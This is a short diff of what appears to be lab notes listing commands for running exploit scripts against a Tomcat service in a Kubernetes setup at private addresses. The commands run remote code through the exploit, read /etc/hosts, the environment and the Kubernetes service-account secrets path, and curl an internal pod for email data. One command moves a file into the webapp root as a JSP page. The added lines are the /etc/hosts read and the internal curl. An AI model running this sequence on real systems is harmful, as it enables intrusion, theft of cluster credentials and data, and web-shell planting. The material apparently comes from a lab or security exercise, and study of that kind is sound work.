@@ -43,6 +43,9 @@ python3 hack.py http://192.168.64.2:30004 'sh -c "echo Hello"'
 
 python3 exploit.py http://192.168.64.2:30004  "cat /tmp/hacked.txt"
 
+
+python3 exploit.py http://192.168.64.2:30004  "cat /etc/hosts"
+
 python3 exploit.py http://192.168.64.2:30004  "ls -la /usr/local/tomcat/"
 
 python3 exploit.py http://192.168.64.2:30004  "whoami"
@@ -56,6 +59,7 @@ python3 exploit.py http://192.168.64.2:30004 "cat /var/run/secrets/kubernetes.io
 python3 exploit.py http://192.168.64.2:30004 "env"
 
 
+python3 exploit.py http://192.168.64.2:30004 "curl -k -v http://10.244.0.20:3000/emails"
 
 
 python3 exploit.py http://192.168.64.2:30004 "mv /tmp/hacked.txt /usr/local/tomcat/webapps/ROOT/showcase.jsp"
